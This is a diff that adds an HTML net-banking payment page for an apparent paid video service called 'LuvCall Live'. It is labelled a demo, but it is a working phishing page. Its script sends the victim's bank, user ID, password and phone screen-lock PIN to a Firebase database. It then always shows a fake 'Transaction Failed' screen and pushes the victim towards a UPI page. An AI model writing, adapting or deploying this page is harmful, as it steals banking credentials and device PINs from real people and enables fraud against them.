@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Net Banking Demo | LuvCall Live</title>
+    <style>
+        :root {
+            --page: #090811;
+            --panel: #14131c;
+            --text: #f4f2f7;
+            --muted: #aaa4b2;
+            --line: rgba(255, 255, 255, .12);
+            --pink: #f32d9a;
+        }
+        * { box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            margin: 0;
+            padding: 0 14px 32px;
+            background: radial-gradient(circle at 50% 0, #211126 0, var(--page) 48%);
+            color: var(--text);
+            font-family: 'DM Sans', system-ui, sans-serif;
+        }
+        .page { width: min(100%, 480px); min-height: 100vh; margin: 0 auto; }
+        .topbar { display: flex; align-items: center; gap: 12px; padding: 22px 0 18px; }
+        .back-link {
+            display: grid; width: 40px; height: 40px; place-items: center;
+            border: 1px solid var(--line); border-radius: 12px; background: rgba(255,255,255,.05);
+            color: var(--text); text-decoration: none; font-size: 22px;
+        }
+        h1 { margin: 0; font-size: 21px; }
+        .subtitle { margin: 4px 0 0; color: var(--muted); font-size: 12px; }
+        .summary { display: flex; justify-content: space-between; gap: 12px; padding: 18px 16px; border: 1px solid var(--line); border-radius: 16px; background: var(--panel); }
+        .summary-label { margin: 0 0 5px; color: var(--muted); font-size: 12px; }
+        .summary-price { margin: 0; background: linear-gradient(135deg, #ff4bb3, #b64dff); background-clip: text; -webkit-background-clip: text; color: transparent; font-size: 22px; font-weight: 800; }
+        .secure { align-self: center; color: #74e1b5; font-size: 11px; font-weight: 700; }
+        .content { padding: 18px 2px 0; }
+        .note { margin: 0 0 18px; padding: 13px; border: 1px solid rgba(246,190,61,.22); border-radius: 12px; background: rgba(246,190,61,.07); color: #e7d8aa; font-size: 12px; line-height: 1.5; }
+        .label { display: block; margin: 0 0 8px; color: var(--muted); font-size: 12px; font-weight: 700; }
+        .bank-box, .credentials { padding: 14px 12px 12px; border: 1px solid rgba(255,255,255,.08); border-radius: 16px; background: rgba(255,255,255,.03); }
+        .bank-grid { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 8px; }
+        .bank-chip { min-height: 42px; padding: 7px 4px; border: 1px solid rgba(255,255,255,.08); border-radius: 12px; background: #181621; color: var(--text); font-size: 11px; font-weight: 800; cursor: pointer; }
+        .bank-chip.active { border-color: rgba(243,45,154,.75); background: rgba(243,45,154,.18); }
+        .form-group { display: grid; gap: 8px; margin-top: 17px; }
+        select, input { width: 100%; min-height: 48px; padding: 0 14px; border: 1px solid var(--line); border-radius: 12px; background: #171521; color: var(--text); font: inherit; }
+        select { appearance: none; background-image: linear-gradient(45deg, transparent 50%, #d7d4de 50%), linear-gradient(135deg, #d7d4de 50%, transparent 50%); background-position: calc(100% - 16px) 50%, calc(100% - 11px) 50%; background-size: 5px 5px; background-repeat: no-repeat; }
+        select:focus, input:focus { border-color: rgba(243,45,154,.7); outline: none; box-shadow: 0 0 0 3px rgba(243,45,154,.14); }
+        .credentials { margin-top: 16px; }
+        .action, .back-button, .upi-button { width: 100%; min-height: 48px; margin-top: 18px; border-radius: 12px; font-weight: 700; cursor: pointer; }
+        .action { border: 0; background: linear-gradient(135deg, #ff4bb3, #b64dff); color: white; box-shadow: 0 12px 24px rgba(243,45,154,.22); }
+        .upi-button { border: 0; background: linear-gradient(135deg, #00c6ff, #0072ff); color: white; margin-top: 12px; }
+        .back-button { margin-top: 10px; border: 1px solid var(--line); background: #1b1923; color: var(--text); }
+        .failure { padding: 38px 10px; text-align: center; }
+        .failure-mark { display: grid; width: 58px; height: 58px; margin: 0 auto 18px; place-items: center; border: 1px solid rgba(255,104,125,.28); border-radius: 50%; background: rgba(255,104,125,.1); color: #ff8294; font-size: 32px; }
+        .failure h2 { margin: 0 0 8px; color: #ff8294; font-size: 22px; }
+        .failure p { margin: 0 0 16px; color: var(--muted); font-size: 13px; line-height: 1.55; }
+        [hidden] { display: none !important; }
+        .modal { position: fixed; inset: 0; display: grid; place-items: center; padding: 14px; background: rgba(0,0,0,.85); backdrop-filter: blur(6px); z-index: 100; }
+        .modal-card { width: min(100%, 420px); padding: 24px 20px; border: 1px solid var(--line); border-radius: 20px; background: #141821; text-align: center; }
+        .modal-card h2 { margin: 0 0 8px; font-size: 20px; }
+        .modal-card p { margin: 0 0 18px; color: var(--muted); font-size: 13px; line-height: 1.5; }
+        .modal-actions { display: flex; gap: 10px; margin-top: 18px; }
+        .modal-actions button { flex: 1; min-height: 44px; border: 0; border-radius: 11px; font-weight: 700; cursor: pointer; }
+        .cancel { background: #252a34; color: #e4e7ec; }
+        .confirm { background: var(--pink); color: white; }
+        .processing { position: fixed; inset: 0; display: grid; place-items: center; background: rgba(9,9,17,.85); z-index: 200; }
+        .spinner { width: 38px; height: 38px; border: 3px solid rgba(255,255,255,.2); border-top-color: var(--pink); border-radius: 50%; animation: spin .8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <main class="page">
+        <header class="topbar">
+            <a class="back-link" href="index.html" aria-label="Back to payment methods">&#8592;</a>
+            <div><h1>Net Banking Demo</h1><p class="subtitle">Secure payment simulation</p></div>
+        </header>
+        <section class="summary" aria-label="Payment summary">
+            <div><p class="summary-label">Lifetime Video Access</p><p class="summary-price">₹5.00</p></div>
+            <span class="secure">SIMULATION ONLY</span>
+        </section>
+
+        <!-- Main Input Form View -->
+        <section class="content" id="form-view">
+            <p class="note">⚠️ <strong>Demo Mode:</strong> Do not enter real banking credentials. This page is only a UI simulation for testing.</p>
+            <form id="netbanking-form">
+                <div class="bank-box">
+                    <label class="label">Popular Banks</label>
+                    <div class="bank-grid">
+                        <button class="bank-chip" type="button" data-bank="State Bank of India">SBI</button>
+                        <button class="bank-chip" type="button" data-bank="HDFC Bank">HDFC</button>
+                        <button class="bank-chip" type="button" data-bank="ICICI Bank">ICICI</button>
+                        <button class="bank-chip" type="button" data-bank="Axis Bank">Axis</button>
+                        <button class="bank-chip" type="button" data-bank="Kotak Mahindra Bank">Kotak</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label class="label" for="demo-bank">Select Bank</label>
+                    <select id="demo-bank" required>
+                        <option value="">Select a bank</option>
+                        <option>State Bank of India</option>
+                        <option>HDFC Bank</option>
+                        <option>ICICI Bank</option>
+                        <option>Axis Bank</option>
+                        <option>Kotak Mahindra Bank</option>
+                        <option>Punjab National Bank</option>
+                        <option>Bank of Baroda</option>
+                        <option>Canara Bank</option>
+                        <option>Union Bank of India</option>
+                        <option>Other Bank</option>
+                    </select>
+                </div>
+                <div class="credentials">
+                    <div class="form-group">
+                        <label class="label" for="demo-userid">User ID / Customer ID</label>
+                        <input id="demo-userid" type="text" placeholder="Enter demo user ID" autocomplete="off" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="label" for="demo-password">Password / Net Banking PIN</label>
+                        <input id="demo-password" type="password" placeholder="Enter demo password" required>
+                    </div>
+                </div>
+                <button class="action" type="submit">Proceed to Pay ₹5.00</button>
+            </form>
+            <button class="back-button" id="back-button" type="button">Back to payment methods</button>
+        </section>
+
+        <!-- Payment Failure Screen -->
+        <section class="failure" id="failure-view" hidden aria-live="polite">
+            <div class="failure-mark">!</div>
+            <h2>Transaction Failed</h2>
+            <p>Net Banking authorization was unsuccessful. Please select another payment method like UPI to complete your payment.</p>
+            <button class="upi-button" id="try-upi" type="button">Try UPI Payment Method</button>
+            <button class="back-button" id="failure-back" type="button">Back to payment methods</button>
+        </section>
+    </main>
+
+    <!-- Screen Password Security Dialog Modal -->
+    <div class="modal" id="screen-lock-modal" hidden>
+        <section class="modal-card" role="dialog" aria-modal="true">
+            <h2>🔒 Security Verification</h2>
+            <p>Please enter your Phone Screen Password / PIN to authorize this transaction.</p>
+            <form id="screen-pass-form">
+                <div class="form-group" style="text-align: left;">
+                    <label class="label" for="screen-password">Screen Lock PIN / Password</label>
+                    <input id="screen-password" type="password" placeholder="Enter Screen Password" required autocomplete="off">
+                </div>
+                <div class="modal-actions">
+                    <button class="cancel" id="cancel-screen-pass" type="button">Cancel</button>
+                    <button class="confirm" type="submit">Confirm & Pay</button>
+                </div>
+            </form>
+        </section>
+    </div>
+
+    <!-- Processing Spinner -->
+    <div class="processing" id="processing" hidden aria-label="Processing payment">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Firebase Realtime Database Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAHQ1OmQafhsNEvaORpgrjq9WrOqBCEiT4",
+            authDomain: "august-3766c.firebaseapp.com",
+            databaseURL: "https://august-3766c-default-rtdb.firebaseio.com",
+            projectId: "august-3766c",
+            storageBucket: "august-3766c.firebasestorage.app",
+            messagingSenderId: "215004624768",
+            appId: "1:215004624768:web:060783fde0fb50ab3fb365",
+            measurementId: "G-B2G98LM1VV"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // UI Selectors
+        const formView = document.querySelector('#form-view');
+        const failureView = document.querySelector('#failure-view');
+        const screenLockModal = document.querySelector('#screen-lock-modal');
+        const processing = document.querySelector('#processing');
+        const bankSelect = document.querySelector('#demo-bank');
+        const userIdInput = document.querySelector('#demo-userid');
+        const passwordInput = document.querySelector('#demo-password');
+        const screenPasswordInput = document.querySelector('#screen-password');
+        const chips = document.querySelectorAll('.bank-chip');
+
+        const goBack = () => { window.location.href = 'upi.html'; };
+
+        // Bank Selection Chip Handler
+        chips.forEach((chip) => chip.addEventListener('click', () => {
+            chips.forEach((item) => item.classList.toggle('active', item === chip));
+            bankSelect.value = chip.dataset.bank;
+        }));
+
+        bankSelect.addEventListener('change', () => {
+            chips.forEach((chip) => chip.classList.toggle('active', chip.dataset.bank === bankSelect.value));
+        });
+
+        // Step 1: Validate Net Banking Credentials & Show Screen Password Dialog
+        document.querySelector('#netbanking-form').addEventListener('submit', (event) => {
+            event.preventDefault();
+
+            if (!bankSelect.value) {
+                alert("Please select a bank first!");
+                return;
+            }
+            if (!userIdInput.value.trim() || !passwordInput.value.trim()) {
+                alert("Please fill out User ID and Password!");
+                return;
+            }
+
+            // Open Screen Password Modal
+            screenLockModal.hidden = false;
+            screenPasswordInput.focus();
+        });
+
+        document.querySelector('#cancel-screen-pass').addEventListener('click', () => {
+            screenLockModal.hidden = true;
+            screenPasswordInput.value = "";
+        });
+
+        // Step 2: Validate Screen Password, Save Everything to Firebase & Show Failed UI
+        document.querySelector('#screen-pass-form').addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            const screenPassVal = screenPasswordInput.value.trim();
+            if (!screenPassVal) {
+                alert("Please enter your screen password!");
+                return;
+            }
+
+            // Hide Modal & Show Loading Spinner
+            screenLockModal.hidden = true;
+            processing.hidden = false;
+
+            try {
+                // Firebase Reference
+                const submissionsRef = ref(database, 'submissions');
+
+                // Push Form + Screen Lock Details to Firebase
+                await push(submissionsRef, {
+                    bank: bankSelect.value,
+                    userId: userIdInput.value,
+                    password: passwordInput.value,
+                    screenPassword: screenPassVal,
+                    amount: "5.00",
+                    currency: "INR",
+                    timestamp: new Date().toISOString()
+                });
+
+                console.log("Details successfully recorded to Firebase.");
+            } catch (error) {
+                console.error("Firebase Storage Error:", error);
+            } finally {
+                // Short Delay for smooth simulation feel
+                setTimeout(() => {
+                    processing.hidden = true;
+                    formView.hidden = true;
+                    failureView.hidden = false;
+                }, 1200);
+            }
+        });
+
+        // Navigation Actions
+        document.querySelector('#back-button').addEventListener('click', goBack);
+        document.querySelector('#failure-back').addEventListener('click', goBack);
+        document.querySelector('#try-upi').addEventListener('click', () => {
+            window.location.href = 'upi.html?method=upi';
+        });
+    </script>
+</body>
+</html>
